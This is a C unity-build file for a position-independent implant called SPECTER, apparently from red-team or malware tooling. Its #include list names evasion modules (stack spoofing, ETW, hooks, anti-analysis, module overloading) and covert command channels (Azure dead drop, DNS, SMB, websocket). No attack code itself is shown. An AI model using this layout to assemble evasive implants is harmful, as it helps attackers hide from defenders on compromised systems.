/**
 * SPECTER Implant — Unity Build
 *
 * Single compilation unit that includes all source files.
 * This eliminates cross-object .refptr pseudo-GOT entries that break
 * position independence when the PIC blob is loaded at runtime.
 *
 * MinGW generates .refptr stubs for extern globals across translation
 * units. By compiling everything as one unit, all references become
 * direct RIP-relative — truly position-independent.
 */

/* Core modules */
#include "hash.c"
#include "string.c"
#include "peb.c"
#include "crypto.c"
#include "crypto_sign.c"
#include "syscalls.c"
#include "syscall_wrappers.c"
#include "transform.c"
#include "config.c"
#include "profile.c"
#include "sleep.c"
#include "comms.c"

/* Evasion modules */
#include "evasion/evasion_core.c"
#include "evasion/stackspoof.c"
#include "evasion/hooks.c"
#include "evasion/etw.c"
#include "evasion/memguard.c"
#include "evasion/antianalysis.c"
#include "evasion/modoverload.c"
#include "evasion/pdata_reg.c"
#include "evasion/ntcontinue_entry.c"

/* Bus / module system */
#include "bus/bus_api.c"
#include "bus/loader.c"
#include "bus/guardian.c"
#include "bus/lifecycle.c"
#include "bus/beacon_shim.c"
#include "bus/clr.c"
#include "bus/inline_asm.c"

/* Comms channel implementations */
#include "comms/azure_deadrop.c"
#include "comms/dns.c"
#include "comms/smb.c"
#include "comms/websocket.c"

/* Entry point — MUST be last so .text.entry section ordering works,
   or use the linker script to place it first regardless */
#include "entry.c"
